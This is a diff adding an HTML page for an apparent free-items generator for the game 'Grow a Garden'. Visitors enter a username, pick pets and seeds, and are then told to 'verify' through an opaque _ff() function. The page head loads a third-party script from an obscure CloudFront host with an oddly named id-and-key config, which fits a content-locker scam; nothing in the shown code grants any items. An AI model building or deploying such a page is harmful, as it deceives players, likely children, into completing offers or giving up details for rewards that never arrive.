@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grow a garden</title>
+    <link rel="stylesheet" href="styles.css">
+    <script type="text/javascript">
+    var DmvGT_cOL_csrFpc={"it":4511732,"key":"d3b51"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/02ac190.js"></script>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="logo"><img src="/growlogo.png" alt=""></div>
+
+        <div class="input-section">
+            <input type="text" id="username" class="username-input" placeholder="Enter Username">
+            <div id="username-error" class="error-message"></div>
+            <button onclick="generateGamepass()" class="generate-btn">Get items</button>
+        </div>
+
+        <div class="selection-text fix-stroke">Browse through the available items :</div>
+        <div id="selection-error" class="selection-error"></div>
+
+        <div class="gamepasses-grid">
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/Racoon.webp" alt=""></div>
+                <div class="gamepass-name">Racoon pet</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/queenbee.webp" alt=""></div>
+                <div class="gamepass-name">Queen Bee</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/candy.webp" alt=""></div>
+                <div class="gamepass-name">Candy Blossom</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/dragonfruit.webp" alt="">
+                </div>
+                <div class="gamepass-name">Dragon Fruit seed</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/beanstalk.png" alt=""></div>
+                <div class="gamepass-name">Beanstalk</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/dragonfly.webp" alt=""></div>
+                <div class="gamepass-name">Dragonfly Pet</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/ember.webp" alt=""></div>
+                <div class="gamepass-name">Ember Lily</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/pepper.webp" alt=""></div>
+                <div class="gamepass-name">Pepper</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 100px;" src="/flowerpack.webp" alt=""></div>
+                <div class="gamepass-name">x10 Flower Pack</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/disco.webp" alt=""></div>
+                <div class="gamepass-name">Disco bee</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/butterfly.webp" alt=""></div>
+                <div class="gamepass-name">Butterfly Pet</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/grape.webp" alt=""></div>
+                <div class="gamepass-name">Grape</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/mango.webp" alt=""></div>
+                <div class="gamepass-name">Mango</div>
+            </div>
+            <div class="gamepass-item" onclick="toggleSelection(this)">
+                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/bamboo.webp" alt=""></div>
+                <div class="gamepass-name">Bamboo</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Modal -->
+    <div id="loadingModal" class="modal">
+        <div class="modal-content loading-content">
+            <div class="loading-spinner"></div>
+            <h2 id="loadingText">Looking for ...</h2>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="verificationModal" class="modal">
+        <div class="modal-content">
+            <h2>🎉 Almost There!</h2>
+            <p>Please verify to get your items.</p>
+            <button class="verify-btn" onclick="_ff()">Verify</button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
